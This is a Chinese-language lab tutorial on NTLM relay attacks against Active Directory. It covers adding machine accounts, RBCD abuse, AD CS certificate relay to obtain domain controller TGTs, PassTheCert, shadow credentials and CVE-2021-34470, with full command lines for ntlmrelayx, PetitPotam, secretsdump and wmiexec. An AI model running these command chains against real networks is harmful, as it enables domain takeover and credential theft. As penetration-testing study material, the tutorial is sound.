攻击的思路可以从域内目标资源对象来展开，分为  
针对 ADCS 的攻击  
针对 域内主机资源的 RBCD 攻击  
针对 当前计算机的攻击  
针对 影子账户的攻击

0x01 添加机器账户
===========

> \--add-computer

攻击条件
----

- 强制认证的目标需要有高权限，可以创建用户
- 目标的 ms-DS-MachineAccountQuota 属性不为0
- 目标具有 SeMachineAccountPrivilege 特权

攻击流程
----

1. 启动监听器  
    利用 ntlmrelay 工具中的参数 --add-computer
    
    ```shell
    python3 ntlmrelayx.py -t ldaps://dc01.hack.lab --add-computer JustTest$ --remove-mic
    ```
    
    修改数据包中的值，需要切换协议，因此需要绕过mic验证，使用到参数 --remove-mic  
    JustTest$ 为新增的机器账户名
2. 触发认证  
    可以通过诱导、欺骗和强制验证等手段触发目标NTLM验证，这里使用 PetitPotam 进行强制认证
    
    ```shell
    python3 PetitPotam.py -d hack.lab -u spiderman -p 123.com 20.20.20.100 20.20.20.6
    ```
    
    ![x1UJ5F.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-fd6f0a9239331b5ec4817d69f5b5ae5e794e4fc3.png)
3. 效果分析  
    可以看到成功创建了机器账户  
    查看 mS-DS-CreatorSID 属性，再通过 SID 反查可以看到是辅域控机器账户添加的（20.20.20.6）
    
    ```shell
    
    AdFind.exe -h 20.20.20.5 -u spiderman -up 123.com -b "DC=hack,DC=lab" -f "objectClass=computer" mS-DS-CreatorSID
    ```

$objSID = New-Object System.Security.Principal.SecurityIdentifier S-1-5-21-3309395417-4108617856-2168433834-2102;$objUser = $objSID.Translate(\[System.Security.Principal.NTAccount\]);$objUser.Value

```php
![x1U8ET.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-88ffdab843f7420abee397f1be01c5543a515c23.png)

拓展

# 0x02 修改目标服务器 RBCD 属性
> --delegate-access
> --escalate-user

## 攻击原理
强制 NTLM 验证后对目标服务器 RBCD 属性进行修改，指向一个新的机器账户（或已存在的）。之后的流程就和 RBCD 攻击一致，利用该机器账户进行后渗透（DCSync）

条件：
- 域控支持 LDAPS 协议
- 能创建机器账户或已有可控的机器账户

## 攻击流程
> 环境简介
> 域名 - hack.lab
> 域控 - DC01 - 20.20.20.5
> 辅域 - F2016 - 20.20.20.6
> 域主机 - USER01 - 20.20.20.10
> Kali - 20.20.20.100

1. 创建机器账户
[bloodyAD](https://github.com/CravateRouge/bloodyAD)
```shell
python3 bloodyAD.py -d hack.lab -u spiderman -p '123.com' --host 20.20.20.5 addComputer CPT001 '123.com'
```

[addcomputer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py)

```shell
python3 addcomputer.py hack.lab/spiderman:123.com -method LDAPS -computer-name CPT001\$ -computer-pass 123.com -dc-ip DC01.hack.lab
```

2. 开启监听  
    使用 ntlmrelay 进行监听 ```shell
    python3 ntlmrelayx.py -t ldap://DC01.hack.lab -smb2support --remove-mic --delegate-access --escalate-user CPT001\$
    ```
    
    由于需要跨协议中继，需要绕过 mic 验证 ，结合 CVE-2019-1040 漏洞执行  
    如果不使用 --remove-mic 参数，会出现以下报错：

![x1UGUU.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-d5404e20d86899dad6f0bc35007119c19fac6a00.png)

3. 使用PetitPotam触发目标 NTLM 验证 ```shell
    python3 PetitPotam.py -d hack.lab -u spiderman -p 123.com 20.20.20.100 20.20.20.10
    ```

![x1U1bV.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-fd108496389225d45ed0fd5add94c6220f8ed702.png)

此外，ntlmrelay工具集成了前两步的功能，直接创建机器账户并修改中继修改目标的 RBCD 属性

```shell
python3 ntlmrelayx.py -t ldaps://DC01.hack.lab -smb2support --delegate-access --remove-mic
```

图中直接显示创建的随机名字和密码  
![x1UlD0.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-72a338aa3f52950638925f28a05891e1e35627ae.png)

4. 验证及使用  
    可以在域控上查看目标服务器（20.20.20.10）的RBCD属性 ```powershell
    Get-ADComputer USER01 -Properties PrincipalsAllowedToDelegateToAccount
    ```
    
    ![x1UtC4.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-b7eb42ebf10d5d91a27136afb4cbf8a7365eeff3.png)

后续的使用就是通过 getST.py 脚本申请服务票据和使用

```shell
python3 getST.py -spn cifs/USER01.hack.lab -impersonate administrator hack.lab/CPT001\$:123.com -dc-ip 20.20.20.5
```

![x1UN8J.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-d381190eba00f2045bdee444cecc0795f0841c4e.png)

0x03 转储AD CS注册服务和证书模板信息
=======================

> \--dump-adcs

攻击原理
----

通过 LDAP 获得域的 ADCS 配置（注册服务和证书模板，以及它们的访问权限），以便能够在没有域账户的情况下知道 ADCS 中继的目标服务器和模板。

网络证书注册服务在其默认配置中容易受到 NTLM Relay 的影响，允许攻击者请求认证他们中继的用户或机器的证书并接管他们的账户

攻击流程
----

1. 找到网络注册服务的地址  
    检查DCs上是否安装了 AD CS 网络注册服务 ```shell
    curl xx.xx.xx.xx/certsrv/ -I
    ```

检查由域的TLS服务提供的TLS证书中的信息

查看本地机器账户的证书

```powershell
Get-ChildItem Cert:\LocalMachine\Root\
```

确定了AD CS的ip为 20.20.20.6

2. 设置监听器  
    使用 ntlmrelay 作为中继监听器  
    参数 --dump-adcs 用于转储AD CS注册服务和证书模板信息
    
    ```shell
    python3 ntlmrelayx.py -debug -t ldap://20.20.20.5 --dump-adcs --remove-mic
    ```
3. 强制NTLM认证
    
    ```shell
    python3 PetitPotam.py -u spiderman -p 123.com -d hack.lab 20.20.20.100 20.20.20.6
    ```
    
    ![x1UavR.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-010646de8f1cb30f14b029b6ce253cc71d0eea62.png)
4. 获得域内信息  
    在 F2016.hack.lab 主机上存在一个注册服务，任何经过认证的用户都可以在上面申请证书。可以获取到允许使用模板的用户有哪些  
    ![x3TyqI.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-2d11838e5ee2823ba1c673edb8459fd2b0725c9d.png)

其次还通过LDAP对域内进行信息收集，并在本地保存了关键信息  
![x1UU29.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-7be5364ecc0e651f9e3c0e874b77719560cf4fdf.png)

0x04 获取AD CS证书
==============

攻击原理
----

在域内配置了AD CS的情况下，可以通过NTLM Relay攻击获取到的证书进行申请 TGT 操作。

> 关于证书攻击的部分可以查看之前的一些文章

前置条件：

1. AD CS被配置为允许NTLM认证
2. NTLM认证没有受到EPA或SMB签名的保护
3. AD CS正在运行这些服务中的任何一个： 
    - 证书颁发机构web注册
    - 证书注册web服务

攻击流程
----

1. 使用 PetitPotam 针对域控强制验证
2. 监听获取域控的认证信息，伪造域控身份
3. 中继域控认证至AD CS上
4. AD CS 返回域控对应的证书
5. 使用该证书向域控申请 TGT  
    ![x3TrMd.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-f6a4a1063df6e37ebc8499c4b9ff816bb771bdbd.png)

### 攻击目标支持 PKINIT 协议

在下面的实验中，攻击目标为域控 DC01$。如果域控支持 PKINIT 协议，在获取到域控的证书后，可以基于 PKINIT 协议申请 TGT。

1. 设置监听器  
    使用ntlmrelay工具进行监听
    
    ```shell
    python3 ntlmrelayx.py -debug -smb2support --target http://20.20.20.6/certsrv/certfnsh.asp --adcs --template DomainController
    ```
2. 强制认证  
    简单演示，使用 PetitPotam 工具进行强制认证
    
    ```shell
    python3 PetitPotam.py -u spiderman -p 123.com -d hack.lab 20.20.20.100 20.20.20.5
    ```
3. 证书处理  
    执行上述两条命令后，可以看到获取到一串 Base64 证书信息，将其保存至 DC01\_base64.txt 文件中  
    ![x3TgdP.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-427a3338d5c4ed09c0195e8f3853d5b5935f8be0.png)

将其解密为 .pfx 文件

```shell
cat DC01_base64.txt | base64 -d > dc01.pfx
```

![x3TssA.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-0739dac72c9c6aca662c7df8e5d71520eda1d5b4.png)

4. 通过gettgtpkinit.py使用证书申请TGT

```shell
python3 gettgtpkinit.py -cert-pfx dc01.pfx hack.lab/DC01$ dc01.ccache

2022-10-04 12:15:43,821 minikerberos INFO     b12ef2da16bdd741749a2ec30e67f0507ba38d7bb72f1c11034bc7160be98e50
INFO:minikerberos:b12ef2da16bdd741749a2ec30e67f0507ba38d7bb72f1c11034bc7160be98e50
2022-10-04 12:15:43,823 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

![x1NSO0.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-df9cb25d6afbb25f19606a6bda6b2a279e0382af.png)

5. 获取到域控TGT的后渗透攻击思路

思路1 - 获取域控Hash

```shell
KRB5CCNAME=dc01.ccache python3 getnthash.py -key b12ef2da16bdd741749a2ec30e67f0507ba38d7bb72f1c11034bc7160be98e50 hack.lab/DC01$
```

![x3TBxH.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-35307dcce67316218cb0e09f902f83b3b98bf4f1.png)

思路2 - 执行DCSync攻击并横向

```shell
KRB5CCNAME=dc01.ccache python3 secretsdump.py -k hack.lab/DC01\$@DC01.hack.lab -no-pass -just-dc-user administrator

python3 wmiexec.py -hashes :42e2656ec24331269f82160ff5962387 hack.lab/administrator@DC01.hack.lab -dc-ip 20.20.20.5
```

![x1N9mV.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-c85b26961fd50cd6ec8cba697ea963ca55eda807.png)

> PS：如果出现如下报错信息  
> \[-\] ERROR\_DS\_NAME\_ERROR\_NOT\_UNIQUE: Name translation: Input name mapped to more than one output name.  
> 就使用 -just-dc-user administrator 参数指定对象

### 攻击目标不支持 PKINIT 协议

这种情况下申请 TGT 票据会出现以下错误：

```shell
KDC_ERR_PADATA_TYPE_NOSUPP Detail: "KDC has no support for PADATA type (pre-authentication data)" 
```

因此只能曲线就过了 —— 需要结合PTC攻击新思路，使用 PassTheCert 工具对LDAP服务器进行认证并进一步执行其他攻击思路。

工具地址 - [PassTheCert](https://github.com/AlmondOffSec/PassTheCert)

域内环境：

```txt
域控 - 20.20.20.5
辅域控（AD CS） - 20.20.20.6
域内主机 - 20.20.20.10
Kali - 20.20.20.100
```

1. 使用 Certipy 工具获取 pfx 文件中的密钥和证书信息
    
    ```shell
    certipy cert -pfx NoPKI02.pfx -nokey -out NoPKI02.crt
    certipy cert -pfx NoPKI02.pfx -nocert -out NoPKI02.key 
    ```
    
    ![x3TcZt.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-0484943bc742b4af5f7e3957b8b241aa173861c4.png)
2. 使用 passthecert.py 创建机器账户
    
    ```shell
    python3 passthecert.py -action add_computer -crt NoPKI02.crt -key NoPKI02.key -domain hack.lab -dc-ip 20.20.20.5 -computer-name NoPKI02$ -computer-pass 123.com
    ```

![x3T2If.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-e6390bd0f9d8f3370c339c4eb0e7a11ef4254137.png)

3. 使用 passthecert.py 添加 RBCD 属性
    
    ```shell
    python3 passthecert.py -action write_rbcd -crt NoPKI02.crt -key NoPKI02.key -domain hack.lab -dc-ip 20.20.20.5 -delegate-from NoPKI02$ -delegate-to DC01$
    ```
    
    ![x3TWi8.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-00e8c6a447520a80912521c26d918a280d735af5.png)
4. 后渗透：申请TGT及攻击
    
    ```shell
    
    python3 getST.py -spn cifs/DC01.hack.lab -impersonate administrator hack.lab/NoPKI02\$:123.com -dc-ip 20.20.20.5
    ```

KRB5CCNAME=administrator.ccache python3 wmiexec.py -k hack.lab/administrator@DC01.hack.lab -no-pass -dc-ip 20.20.20.5

```php

# 0x05 修改 Shadow Credentials 属性 | 影子账户
> --shadow-credentials

## 攻击原理
在支持 PKINIT 协议的域内环境，若目标机器账户存在 msDS-KeyCredentialLink 属性（公钥信息），在预认证中，可以使用对应的证书（私钥信息）进行验证身份。
通过 NTLM Relay 攻击强制修改目标服务器的 msDS-KeyCredentialLink 属性，使用私钥信息申请 TGT，实现对目标对象持久和隐蔽的访问

具体的原理在[之前的文章](https://forum.butian.net/share/1607)中有详细介绍过

条件：
- 目标服务器支持 PKINIT 协议
- 域控制器版本在Windows Server 2016以上
- 域内安装了AD CS服务

## 攻击流程
1. 开启监听器
使用[ntlmrelayx.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py)工具开启监听， --remove-mic 参数用于跨协议时LDAP签名的消除
```shell
python3 ntlmrelayx.py -t ldap://DC01.hack.lab --remove-mic --shadow-credentials --shadow-target F2016$
```

2. 执行强制认证  
    使用PetitPotam.py进行强制认证 ```shell
    python3 PetitPotam.py -u spiderman -p 123.com -d hack.lab 20.20.20.100 20.20.20.6
    ```

生成了对应的证书，由于需要结合AD CS使用，也分为两种情况：  
支持 PKINIT 协议和不支持 PKINIT 协议  
详情可以参考上一部分

0x06 利用 Exchange 创建机器账户
=======================

> CVE-2021-34470  
> 绕过创建机器账户的限制

攻击原理
----

在域中对普通用户限制创建机器账户的情况下，利用 Exchange 安装中一个有漏洞的LDAP模式对象，执行添加机器账户操作。

背景：  
由于域内用户权限不正确及配置的不当，导致用户创建机器账户进行域内渗透攻击。  
因此，在常见的域内加固过程中，对域用户创建机器账户进行限制主要可以通过以下两种方法：

1. 修改域对象的LDAP属性ms-DS-MachineAccountQuota，默认为10，设置为0即可
2. 域特权SeMachineAccountPrivilege，管理哪些用户可以向域添加机器账户，默认设置为Authenticated Users，即全部用户。可以将其修改为小范围高权限用户，如Domain Admins

该漏洞在2021年7月由James Forshaw公布，编号为CVE-2021-34470，一个计算机账户可以在自己下面创建一个msExchStorageGroup对象，然后在这个对象下可以创建许多类型的额外对象，包括机器账户。

简而言之，利用 Exchange 中存在缺陷的对象创建机器账户

相关攻击方式已经集成至 ntlmrelay 中的 --add-computer 参数中，详情见该[pull](https://github.com/SecureAuthCorp/impacket/pull/1288)  
工具使用可以查看 --add-computer 部分